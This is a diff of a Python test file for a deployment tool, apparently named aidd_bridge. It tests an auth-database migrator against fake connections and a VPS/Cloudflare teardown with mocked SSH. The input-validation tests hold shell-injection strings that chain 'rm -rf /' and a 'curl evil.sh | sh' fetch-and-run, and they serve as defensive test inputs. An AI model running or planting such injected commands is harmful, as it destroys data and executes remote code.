@@ -2,12 +2,17 @@
 import os
 import json
 import tempfile
+import argparse
+from types import SimpleNamespace
 import pytest
 from aidd_bridge.scanner import LovableScanner
 from aidd_bridge.data_bridge import DataBridge
 from aidd_bridge.devops import DevOpsPackager
 from aidd_bridge.unifier import MultiAppUnifier
-from aidd_bridge.auth_migrator import plan_migration
+from aidd_bridge.auth_migrator import plan_migration, AuthMigrator
+from aidd_bridge.teardown import BridgeTeardown
+import aidd_bridge.teardown as bridge_teardown_mod
+import aidd_bridge.cli as cli_module
 
 @pytest.fixture
 def mock_lovable_project(tmp_path):
@@ -293,3 +298,427 @@ def test_devops_swarm_postgrest_strips_rest_prefix(tmp_path):
     swarm_yaml = packager.generate_docker_compose_swarm()
     assert "middlewares.app-meusite-com-api-strip.stripprefix.prefixes=/rest/v1" in swarm_yaml
     assert "traefik.http.routers.app-meusite-com-api.middlewares=app-meusite-com-api-strip" in swarm_yaml
+
+def test_teardown_accepts_valid_app_name_and_domain():
+    teardown = BridgeTeardown(app_name="hub-teste", domain="hub-teste.vpsconexao.org")
+    assert teardown.app_name == "hub-teste"
+    assert teardown.domain == "hub-teste.vpsconexao.org"
+
+def test_teardown_rejects_app_name_with_shell_injection():
+    # app_name vira literal num comando shell remoto (docker stack rm, rm -rf);
+    # sem essa trava, um nome como abaixo rodaria um segundo comando na VPS.
+    with pytest.raises(ValueError):
+        BridgeTeardown(app_name="hub; rm -rf /")
+
+def test_teardown_rejects_app_name_with_spaces_or_empty():
+    with pytest.raises(ValueError):
+        BridgeTeardown(app_name="hub teste")
+    with pytest.raises(ValueError):
+        BridgeTeardown(app_name="")
+
+def test_teardown_rejects_domain_with_shell_injection():
+    with pytest.raises(ValueError):
+        BridgeTeardown(app_name="hub-teste", domain="hub-teste.com; curl evil.sh | sh")
+
+
+# ---------------------------------------------------------------------------
+# AuthMigrator — banco de dados de mentira (fake), sem Postgres real.
+# Simula so o formato de consulta que o codigo de verdade manda, guardando
+# dados em dicionarios Python em vez de tabelas.
+# ---------------------------------------------------------------------------
+
+import re as _re
+
+_INSERT_RE = _re.compile(r'INSERT INTO "(\w+)"\."(\w+)" \((?P<cols>.+?)\) VALUES')
+_SELECT_RE = _re.compile(r'SELECT (?P<cols>.+) FROM "(\w+)"\."(\w+)"$')
+
+
+class _FakeAuthCursor:
+    def __init__(self, conn, dict_mode):
+        self.conn = conn
+        self.dict_mode = dict_mode
+        self._result = []
+
+    def __enter__(self):
+        return self
+
+    def __exit__(self, *exc):
+        return False
+
+    def execute(self, sql, params=None):
+        flat = " ".join(sql.split())
+        if "information_schema.columns" in flat:
+            schema, table = params
+            self._result = [(c,) for c in self.conn.columns.get((schema, table), set())]
+            return
+        m = _INSERT_RE.search(flat)
+        if m:
+            schema, table = m.group(1), m.group(2)
+            colnames = _re.findall(r'"(\w+)"', m.group("cols"))
+            row = dict(zip(colnames, params))
+            self.conn.inserted.setdefault((schema, table), []).append(row)
+            self._result = []
+            return
+        m = _SELECT_RE.search(flat)
+        if m:
+            schema, table = m.group(2), m.group(3)
+            colnames = _re.findall(r'"(\w+)"', m.group("cols"))
+            if len(colnames) == 1:
+                ids = self.conn.existing_ids.get((schema, table), set())
+                self._result = [(i,) for i in ids]
+            else:
+                rows = self.conn.rows.get((schema, table), [])
+                if self.dict_mode:
+                    self._result = [{c: r.get(c) for c in colnames} for r in rows]
+                else:
+                    self._result = [tuple(r.get(c) for c in colnames) for r in rows]
+            return
+        raise AssertionError(f"consulta nao esperada no banco de mentira: {flat}")
+
+    def fetchall(self):
+        return self._result
+
+
+class _FakeAuthConnection:
+    def __init__(self, columns=None, rows=None, existing_ids=None):
+        self.columns = columns or {}
+        self.rows = rows or {}
+        self.existing_ids = existing_ids or {}
+        self.inserted = {}
+        self.closed = False
+        self.commits = 0
+
+    def cursor(self, cursor_factory=None):
+        return _FakeAuthCursor(self, dict_mode=cursor_factory is not None)
+
+    def commit(self):
+        self.commits += 1
+
+    def close(self):
+        self.closed = True
+
+
+def _make_source_and_target():
+    source = _FakeAuthConnection(
+        columns={
+            ("auth", "users"): {"id", "email", "encrypted_password"},
+            ("auth", "identities"): {"identity_id", "user_id", "provider"},
+        },
+        rows={
+            ("auth", "users"): [
+                {"id": "u1", "email": "ja-existe@example.com", "encrypted_password": "hash1"},
+                {"id": "u2", "email": "conta-nova@example.com", "encrypted_password": "hash2"},
+            ],
+            ("auth", "identities"): [
+                {"identity_id": "i1", "user_id": "u1", "provider": "email"},
+                {"identity_id": "i2", "user_id": "u2", "provider": "email"},
+            ],
+        },
+    )
+    target = _FakeAuthConnection(
+        columns={
+            ("auth", "users"): {"id", "email", "encrypted_password"},
+            ("auth", "identities"): {"identity_id", "user_id", "provider"},
+        },
+        existing_ids={
+            ("auth", "users"): {"u1"},
+            ("auth", "identities"): {"i1"},
+        },
+    )
+    return source, target
+
+
+def _wire_migrator(monkeypatch, source, target):
+    migrator = AuthMigrator("source-dsn", "target-dsn")
+    monkeypatch.setattr(migrator, "_connect", lambda dsn: source if dsn == "source-dsn" else target)
+    return migrator
+
+
+def test_auth_migrator_preview_mode_never_writes_to_target(monkeypatch):
+    source, target = _make_source_and_target()
+    migrator = _wire_migrator(monkeypatch, source, target)
+
+    report = migrator.migrate(dry_run=True)
+
+    assert report["dry_run"] is True
+    assert report["users"]["would_insert"] == 1
+    assert report["users"]["inserted"] == 0
+    assert target.inserted == {}
+
+
+def test_auth_migrator_apply_inserts_only_new_account_and_preserves_password_hash(monkeypatch):
+    source, target = _make_source_and_target()
+    migrator = _wire_migrator(monkeypatch, source, target)
+
+    report = migrator.migrate(dry_run=False)
+
+    assert report["users"]["inserted"] == 1
+    novos = target.inserted[("auth", "users")]
+    assert [u["id"] for u in novos] == ["u2"]
+    assert novos[0]["encrypted_password"] == "hash2"  # hash preservado, nunca trocado
+
+    novas_identidades = target.inserted[("auth", "identities")]
+    assert [i["identity_id"] for i in novas_identidades] == ["i2"]
+
+
+def test_auth_migrator_never_touches_account_that_already_exists_on_rerun(monkeypatch):
+    source, target = _make_source_and_target()
+    # simula rodar a migracao de novo depois que tudo ja foi inserido antes
+    target.existing_ids[("auth", "users")] = {"u1", "u2"}
+    target.existing_ids[("auth", "identities")] = {"i1", "i2"}
+
+    migrator = _wire_migrator(monkeypatch, source, target)
+    report = migrator.migrate(dry_run=False)
+
+    assert report["users"]["inserted"] == 0
+    assert report["identities"]["inserted"] == 0
+    assert target.inserted == {}
+
+
+def test_auth_migrator_skips_identities_when_target_schema_incompatible(monkeypatch):
+    source, target = _make_source_and_target()
+    target.columns[("auth", "identities")] = {"identity_id", "user_id"}  # falta "provider" no destino
+
+    migrator = _wire_migrator(monkeypatch, source, target)
+    report = migrator.migrate(dry_run=True)
+
+    assert "skipped_incompatible" in report["identities"]
+    assert report["identities"]["inserted"] == 0
+
+
+def test_auth_migrator_closes_both_connections_even_when_migration_fails(monkeypatch):
+    source, target = _make_source_and_target()
+    target.columns[("auth", "users")] = {"id", "email"}  # falta "encrypted_password" no destino
+
+    migrator = _wire_migrator(monkeypatch, source, target)
+    with pytest.raises(RuntimeError):
+        migrator.migrate(dry_run=True)
+
+    assert source.closed
+    assert target.closed
+
+
+# ---------------------------------------------------------------------------
+# BridgeTeardown — servidor (SSH) e Cloudflare de mentira, sem rede real.
+# ---------------------------------------------------------------------------
+
+class _FakeSSHStream:
+    def __init__(self, output=""):
+        self._output = output.encode("utf-8")
+        self.channel = SimpleNamespace(recv_exit_status=lambda: 0)
+
+    def read(self):
+        return self._output
+
+
+class _FakeSSHClient:
+    def __init__(self, connect_error=None):
+        self.connected = False
+        self.commands = []
+        self.closed = False
+        self._connect_error = connect_error
+
+    def set_missing_host_key_policy(self, policy):
+        pass
+
+    def connect(self, host, username=None, password=None, timeout=None):
+        if self._connect_error:
+            raise self._connect_error
+        self.connected = True
+        self.host = host
+
+    def exec_command(self, cmd):
+        self.commands.append(cmd)
+        return None, _FakeSSHStream("ok"), _FakeSSHStream("")
+
+    def close(self):
+        self.closed = True
+
+
+def _wire_fake_ssh(monkeypatch, fake_ssh):
+    monkeypatch.setattr(
+        bridge_teardown_mod,
+        "paramiko",
+        SimpleNamespace(SSHClient=lambda: fake_ssh, AutoAddPolicy=lambda: None),
+    )
+    monkeypatch.setattr(bridge_teardown_mod.time, "sleep", lambda s: None)
+
+
+def test_destroy_vps_stack_removes_stack_volumes_and_directory(monkeypatch):
+    fake_ssh = _FakeSSHClient()
+    _wire_fake_ssh(monkeypatch, fake_ssh)
+
+    teardown = BridgeTeardown(app_name="hub-teste", vps_host="1.2.3.4", vps_password="senha")
+    result = teardown.destroy_vps_stack()
+
+    assert result["status"] == "success"
+    assert fake_ssh.connected and fake_ssh.closed
+    assert "docker stack rm hub-teste" in fake_ssh.commands
+    assert any("docker volume rm" in c for c in fake_ssh.commands)
+    assert "rm -rf /root/hub-teste && rm -f /root/aidd-bridge-deploy/hub-teste*" in fake_ssh.commands
+
+
+def test_destroy_vps_stack_can_skip_volumes_and_directory(monkeypatch):
+    fake_ssh = _FakeSSHClient()
+    _wire_fake_ssh(monkeypatch, fake_ssh)
+
+    teardown = BridgeTeardown(app_name="hub-teste", vps_host="1.2.3.4", vps_password="senha")
+    result = teardown.destroy_vps_stack(remove_volumes=False, remove_dir=False)
+
+    assert result["details"]["volumes"] is None
+    assert result["details"]["directory"] is None
+    assert not any("docker volume rm" in c for c in fake_ssh.commands)
+    assert not any(c.startswith("rm -rf") for c in fake_ssh.commands)
+
+
+def test_destroy_vps_stack_fails_without_credentials(monkeypatch):
+    monkeypatch.delenv("VPS_HOST", raising=False)
+    monkeypatch.delenv("VPS_PASSWORD", raising=False)
+
+    teardown = BridgeTeardown(app_name="hub-teste")
+    result = teardown.destroy_vps_stack()
+
+    assert result["status"] == "error"
+
+
+def test_destroy_vps_stack_fails_cleanly_when_paramiko_not_installed(monkeypatch):
+    monkeypatch.setattr(bridge_teardown_mod, "paramiko", None)
+
+    teardown = BridgeTeardown(app_name="hub-teste", vps_host="1.2.3.4", vps_password="senha")
+    result = teardown.destroy_vps_stack()
+
+    assert result["status"] == "error"
+    assert "paramiko" in result["error"]
+
+
+def test_destroy_vps_stack_returns_error_and_closes_ssh_on_connection_failure(monkeypatch):
+    fake_ssh = _FakeSSHClient(connect_error=TimeoutError("nao conectou"))
+    _wire_fake_ssh(monkeypatch, fake_ssh)
+
+    teardown = BridgeTeardown(app_name="hub-teste", vps_host="1.2.3.4", vps_password="senha")
+    result = teardown.destroy_vps_stack()
+
+    assert result["status"] == "error"
+    assert fake_ssh.closed
+
+
+def test_delete_cloudflare_dns_skips_when_credentials_missing():
+    teardown = BridgeTeardown(app_name="hub-teste")
+    result = teardown.delete_cloudflare_dns()
+    assert result["status"] == "skipped"
+
+
+def test_delete_cloudflare_dns_calls_cloudflare_client_with_right_domain(monkeypatch):
+    calls = {}
+
+    class _FakeCF:
+        def __init__(self, zone_id, api_token):
+            calls["zone_id"] = zone_id
+            calls["api_token"] = api_token
+
+        def deletar_registro(self, domain):
+            calls["domain"] = domain
+            return {"status": "success", "deleted": [{"id": "abc"}]}
+
+    monkeypatch.setattr(bridge_teardown_mod, "CloudflareDNS", _FakeCF)
+
+    teardown = BridgeTeardown(
+        app_name="hub-teste", domain="hub-teste.vpsconexao.org",
+        cf_api_token="tok", cf_zone_id="zone1",
+    )
+    result = teardown.delete_cloudflare_dns()
+
+    assert result["status"] == "success"
+    assert calls == {"zone_id": "zone1", "api_token": "tok", "domain": "hub-teste.vpsconexao.org"}
+
+
+def test_execute_teardown_combines_dns_and_vps_results(monkeypatch):
+    monkeypatch.setattr(
+        bridge_teardown_mod, "CloudflareDNS",
+        lambda zone_id, api_token: SimpleNamespace(deletar_registro=lambda domain: {"status": "success"}),
+    )
+    fake_ssh = _FakeSSHClient()
+    _wire_fake_ssh(monkeypatch, fake_ssh)
+
+    teardown = BridgeTeardown(
+        app_name="hub-teste", domain="hub-teste.com",
+        vps_host="1.2.3.4", vps_password="senha",
+        cf_api_token="t", cf_zone_id="z",
+    )
+    result = teardown.execute_teardown()
+
+    assert result["app_name"] == "hub-teste"
+    assert result["dns"]["status"] == "success"
+    assert result["vps"]["status"] == "success"
+
+
+# ---------------------------------------------------------------------------
+# cmd_destroy — fluxo completo da linha de comando (confirmacao, --yes, erros)
+# ---------------------------------------------------------------------------
+
+def _destroy_args(**overrides):
+    defaults = dict(
+        app_name="hub-teste", domain=None, vps_host=None, vps_user="root",
+        vps_password=None, cf_token=None, cf_zone_id=None, yes=True,
+    )
+    defaults.update(overrides)
+    return argparse.Namespace(**defaults)
+
+
+def test_cmd_destroy_cancels_when_user_does_not_confirm(monkeypatch, capsys):
+    monkeypatch.setattr("builtins.input", lambda prompt: "n")
+
+    def _should_not_run(**kw):
+        raise AssertionError("nao deveria instanciar BridgeTeardown sem confirmacao")
+    monkeypatch.setattr(cli_module, "BridgeTeardown", _should_not_run)
+
+    rc = cli_module.cmd_destroy(_destroy_args(yes=False))
+
+    assert rc == 0
+    assert "CANCELADO" in capsys.readouterr().out
+
+
+def test_cmd_destroy_skips_confirmation_prompt_with_yes_flag(monkeypatch):
+    def _fail_if_asked(prompt):
+        raise AssertionError("nao deveria perguntar nada com --yes")
+    monkeypatch.setattr("builtins.input", _fail_if_asked)
+
+    class _FakeTeardown:
+        def __init__(self, **kw):
+            pass
+
+        def execute_teardown(self):
+            return {
+                "dns": {"status": "skipped"},
+                "vps": {"status": "success", "details": {"stack": "removida", "volumes": "ok", "directory": "ok"}},
+            }
+
+    monkeypatch.setattr(cli_module, "BridgeTeardown", _FakeTeardown)
+
+    rc = cli_module.cmd_destroy(_destroy_args(yes=True))
+
+    assert rc == 0
+
+
+def test_cmd_destroy_returns_error_code_when_vps_teardown_fails(monkeypatch):
+    class _FakeTeardown:
+        def __init__(self, **kw):
+            pass
+
+        def execute_teardown(self):
+            return {"dns": {"status": "skipped"}, "vps": {"status": "error", "error": "falha ssh"}}
+
+    monkeypatch.setattr(cli_module, "BridgeTeardown", _FakeTeardown)
+
+    rc = cli_module.cmd_destroy(_destroy_args(yes=True))
+
+    assert rc == 1
+
+
+def test_cmd_destroy_rejects_invalid_app_name_before_touching_network(capsys):
+    # Usa o BridgeTeardown de verdade (nao mockado): a validacao precisa
+    # barrar o nome malicioso antes de qualquer tentativa de SSH/DNS.
+    rc = cli_module.cmd_destroy(_destroy_args(app_name="hub; rm -rf /", yes=True))
+
+    assert rc == 1
+    assert "invalido" in capsys.readouterr().out
